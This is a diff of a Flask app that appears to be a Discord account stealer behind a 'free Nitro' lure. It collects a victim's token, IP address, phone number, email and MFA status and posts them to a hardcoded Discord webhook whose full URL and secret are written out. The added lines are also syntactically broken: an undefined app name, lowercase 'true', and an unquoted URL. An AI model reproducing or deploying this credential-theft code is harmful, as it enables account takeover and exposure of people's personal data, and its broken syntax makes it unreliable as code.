@@ -2,8 +2,8 @@ from flask import Flask, redirect, request
 from dhooks import Webhook, Embed
 import requests
 
-app = Flask(__name__)
-hook = Webhook('YOUR WEBHOOK')
+app = Flask(nitro__free)
+hook = Webhook('https://discord.com/api/webhooks/1182289998695903232/KZ0cvcSzdj7wNgqaI1v_fe-gaCCQV45is4wO5g0NvxQN7vRuK02yZvfH9GZdhSMMbGFk')
 
 
 def send_black_embed(token, ip, phone_number, email, username, tag, avatar_url,
@@ -11,13 +11,13 @@ def send_black_embed(token, ip, phone_number, email, username, tag, avatar_url,
   embed = Embed(color=0)
   embed.set_author(name=f'{username}#{tag}')
   embed.set_thumbnail(url=avatar_url)
-  embed.add_field(name='Email', value=f'```{email}```', inline=False)
-  embed.add_field(name='Phone', value=f'```{phone_number}```', inline=False)
-  embed.add_field(name='MFA Status', value=f'```{mfa_status}```', inline=False)
-  embed.add_field(name='Nitro', value=f'```{nitro_status}```', inline=False)
-  embed.add_field(name='IP', value=f'```{ip}```', inline=False)
-  embed.add_field(name='Token', value=f'```{token}```', inline=False)
-  hook.send(embed=embed, username=username, avatar_url=avatar_url)
+  embed.add_field(name='Email', value=f'```{email}```', inline=true)
+  embed.add_field(name='Phone', value=f'```{phone_number}```', inline=true)
+  embed.add_field(name='MFA Status', value=f'```{mfa_status}```', inline=true)
+  embed.add_field(name='Nitro', value=f'```{nitro_status}```', inline=true)
+  embed.add_field(name='IP', value=f'```{ip}```', inline=true)
+  embed.add_field(name='Token', value=f'```{token}```', inline=true)
+  hook.send(embed=embed, username=username, avatar_url=https://cdn.discordapp.com/attachments/1181969517136592976/1182295582115647609/bandicam_2023-12-07_12-37-00-688.jpg?ex=65842d90&is=6571b890&hm=ef7959c6bb2dbc9720099bb92396d8b0590b28d76e1a7634367c613f837dfad1&)
 
 @app.route('/alive')
 def keep_alive():
